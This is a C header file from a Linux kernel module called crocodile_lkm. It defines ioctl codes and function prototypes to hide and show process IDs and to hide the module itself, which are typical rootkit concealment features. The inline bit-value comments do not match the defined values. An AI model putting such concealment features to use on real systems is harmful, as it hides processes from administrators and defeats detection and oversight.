/*
 * crocodile_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_
#define _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_

#include "device/types.h"

/******************************************************************************
 * Ioctl definitions
 ******************************************************************************/

/* Use 'k' as magic number */
#define CROC_IOC_MAGIC          'k'

#define CROC_IOC_MAX_NR         1

#define CROC_IOC_HIDE_CMD       0b00001
#define CROC_IOC_SHOW_CMD       0b00010
#define CROC_IOC_PID            0b00100
#define CROC_IOC_MOD            0b01000
#define CROC_IOC_LOG            0b10000

#define CROC_IOC_RESET          _IO(CROC_IOC_MAGIC, 0)
#define CROC_IOC_HIDE_PID       _IOW(CROC_IOC_MAGIC,  CROC_IOC_PID | CROC_IOC_HIDE_CMD, int)   // 0b010
#define CROC_IOC_SHOW_PID       _IOW(CROC_IOC_MAGIC,  CROC_IOC_PID | CROC_IOC_SHOW_CMD, int)   // 0b011
#define CROC_IOC_HIDE_MOD       _IOW(CROC_IOC_MAGIC,  CROC_IOC_MOD | CROC_IOC_HIDE_CMD, int)   // 0b100
#define CROC_IOC_SHOW_MOD       _IOW(CROC_IOC_MAGIC,  CROC_IOC_MOD | CROC_IOC_SHOW_CMD, int)   // 0b101

int ioc_hide_pid(module_dev_t* p_dev, pid_t pid);

int ioc_show_pid(module_dev_t* p_dev, pid_t pid);

int ioc_parse_cmd(char* p_cmd_str, size_t count, unsigned int* p_cmd, unsigned long* p_arg);

#endif /* _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_ */

